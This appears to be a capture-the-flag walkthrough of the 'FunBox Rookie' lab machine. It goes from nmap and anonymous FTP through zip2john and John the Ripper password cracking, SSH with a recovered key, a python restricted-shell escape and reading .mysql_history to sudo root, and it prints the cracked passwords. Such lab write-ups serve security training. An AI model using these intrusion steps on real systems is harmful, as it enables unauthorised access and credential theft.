*FunBox Rookie*  
**RECON**
---
**Ip Search**   
Apache Server  
![image19](https://user-images.githubusercontent.com/66635295/159421830-8e052a02-4fb1-42a7-bb76-a29384f7eb43.png)  


**Nmap Scan**  
<pre>nmap -sC -sV 192.168.52.107 </pre>  
-safe scripts -service version  
Anonymous FTP Login available, various visible zip files   
![image14](https://user-images.githubusercontent.com/66635295/159421862-50889fc0-271d-4119-b938-c878c7eebef6.png)  

**ENUMURATION**
---
<pre>ftp 192.168.52.107</pre>  
<pre>Name: anonymous </pre>  
<pre>Password: anonymous@domain.com </pre>    
![image5](https://user-images.githubusercontent.com/66635295/159422223-b78bc143-e7ca-4dad-8f8c-f0a2e94064af.png)  
**Grab zip Files**  
<pre> mget homer.zip john.zip tom.zip </pre>    
![image15](https://user-images.githubusercontent.com/66635295/159422555-864c3dc4-7503-48f3-93d4-69ae9dc76c4b.png)  
**Inspect File**  
Password locked id_rsa keys  
![image18](https://user-images.githubusercontent.com/66635295/159422579-2c509021-3e9f-4e53-9e29-198100978dda.png)  
**Change zip to Crack Passwords**    
 <pre> zip2john homer.zip homer.hash </pre>  
![image17](https://user-images.githubusercontent.com/66635295/159422865-d16a8a8c-a474-4ff5-aa2a-568b52fd8a9b.png)  
**Insall word list**  
<pre> rockyou.txt </pre>  
![image12](https://user-images.githubusercontent.com/66635295/159422892-ee67dea5-9ace-43a8-af9c-eed5e8b6236e.png)  
**Organize files into one directory**   
![image4](https://user-images.githubusercontent.com/66635295/159422979-7c4dfbd1-289d-4f12-8ac8-58bea37d4f15.png)  
**John the  Ripper**  
<pre> john --wordlist=$rockyou tom.hash </pre>  
![image3](https://user-images.githubusercontent.com/66635295/159423177-7d3650d4-892e-4514-af1f-9eec7a14fefa.png)  
**Extract tom.zip**  
<pre> iubire </pre>  
![image2](https://user-images.githubusercontent.com/66635295/159425066-154a9577-fa2b-4aae-a58f-105cf2776c57.png)  
Id_rsa key  
![image6](https://user-images.githubusercontent.com/66635295/159425574-e65d557f-e725-46bb-893a-acf582b37d25.png)  

**PRIVILEGE ESCALATION**
---
**SSH**  
<pre>  ssh -i id_rsa tom@192.168.52.107 </pre>  
Success logged in as tom  
![image10](https://user-images.githubusercontent.com/66635295/159425641-8fdceb4d-d295-4c66-86f0-880bfd29e74f.png)  
**Flag**  
<pre> cat local.txt  </pre>  
![image8](https://user-images.githubusercontent.com/66635295/159425808-c0e979c9-8554-4c2d-8349-9dbe9f98c006.png)  
Restricted Shell  
![image11](https://user-images.githubusercontent.com/66635295/159425861-3fc58b29-97e9-4023-aee7-03cd929aac54.png)  
**Checking Sudo Privileges**  
Tom can run all commands definitely worth pursuing  
![image9](https://user-images.githubusercontent.com/66635295/159426027-b8ee5bde-ba1b-4a8b-bf64-10696f627734.png)  
**Remove Shell Restrictions**  
<pre> python3 -c ‘import os; os.system(“/bin/bash”);’ </pre>  
![image7](https://user-images.githubusercontent.com/66635295/159426463-79d3e971-ccc3-4a57-a84a-ecc6ce5c9a92.png)  
**Check for hidden files**  
<pre>ls -la </pre>  
![image16](https://user-images.githubusercontent.com/66635295/159426482-c8a1c784-fca5-4e7a-b79c-423ee045c0f4.png)  
**Reading mysql_history**  
<pre> cat .mysql_history  </pre>  
Reveals password  
![image1](https://user-images.githubusercontent.com/66635295/159426632-25601f14-984b-4dce-b627-3014407b34a1.png)  

**ROOT ESCALATION**
---
**Root Flag**  
<pre> sudo su  </pre>  
<pre> xx11yy22!  </pre>  
<pre> cat  proof.txt  </pre>  
![image13](https://user-images.githubusercontent.com/66635295/159426848-a3dc6b3f-670c-4b69-a82c-aa354baa4b95.png)


